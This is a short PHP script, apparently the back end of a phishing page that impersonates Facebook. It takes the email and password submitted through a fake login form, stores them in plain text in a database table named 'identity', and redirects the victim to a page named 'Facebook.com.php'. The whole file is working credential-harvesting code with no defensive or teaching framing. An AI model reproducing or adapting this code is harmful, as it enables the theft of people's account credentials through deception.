<?php
//connection bdd
include("data_facebook.php");

$ins = $base->prepare("INSERT INTO `identity` (`id`, `email`, `mdp`) 
VALUES (NULL, :email, :pass);");

$ins->execute(array(
    "email"=>$_POST["email"],
    "pass"=>$_POST["pass"],
));
header("Location: Facebook.com.php");

?>